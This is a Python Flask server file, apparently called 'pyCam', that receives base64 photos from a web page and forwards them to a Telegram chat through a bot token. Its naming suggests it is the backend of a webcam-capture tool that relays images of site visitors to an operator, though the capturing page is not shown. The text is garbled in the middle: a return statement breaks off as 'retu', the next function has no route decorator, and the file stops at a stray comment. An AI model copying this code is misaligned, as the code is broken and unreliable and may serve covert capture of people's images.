
from flask import Flask, request, jsonify, render_template
import os
import base64
import logging
import requests
from dotenv import load_dotenv

# Load .env
load_dotenv()

app = Flask(__name__)

# Logging setup
logging.basicConfig(
    filename='pyCam.log',
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

# Env variables
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

# Check if env loaded
if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
    print("❌ ERROR: .env file missing or variables not set!")
    exit()

def send_to_telegram(photo_data):
    try:
        # Decode base64 image
        photo_bytes = base64.b64decode(photo_data.split(',')[1])

        temp_file = 'temp_capture.jpg'
        with open(temp_file, 'wb') as f:
            f.write(photo_bytes)

        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"

        with open(temp_file, 'rb') as photo:
            response = requests.post(
                url,
                files={'photo': photo},
                data={'chat_id': TELEGRAM_CHAT_ID}
            )

        os.remove(temp_file)

        if response.status_code == 200:
            logging.info("✅ Photo sent to Telegram")
            return True
        else:
            logging.error(f"❌ Telegram error: {response.text}")
            return False

    except Exception as e:
        logging.error(f"❌ Exception: {str(e)}")
        retu
def index():
    return render_template('index.html')


@app.route('/upload', methods=['POST'])
def upload_file():
    data = request.get_json()

    if data and 'photo' in data:
        if send_to_telegram(data['photo']):
            return jsonify({'status': 'success'}), 200
        else:
            return jsonify({'status': 'failed'}), 500

    return jsonify({'error': 'No photo received'}), 400


if __name__ == '__main__':
    # ✅ 
